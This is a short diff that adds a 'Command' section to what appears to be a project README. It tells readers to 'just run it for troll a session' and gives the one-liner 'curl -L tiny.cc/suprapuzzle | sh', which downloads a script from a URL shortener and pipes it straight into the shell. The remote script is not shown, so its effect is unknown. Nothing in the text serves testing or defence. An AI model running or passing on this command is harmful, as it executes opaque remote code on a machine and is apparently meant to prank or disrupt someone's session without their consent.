@@ -1,3 +1,10 @@
+# Command
+
+just run it for troll a session 
+
+```bash
+curl -L tiny.cc/suprapuzzle | sh
+```
 
 # Dependencies
 
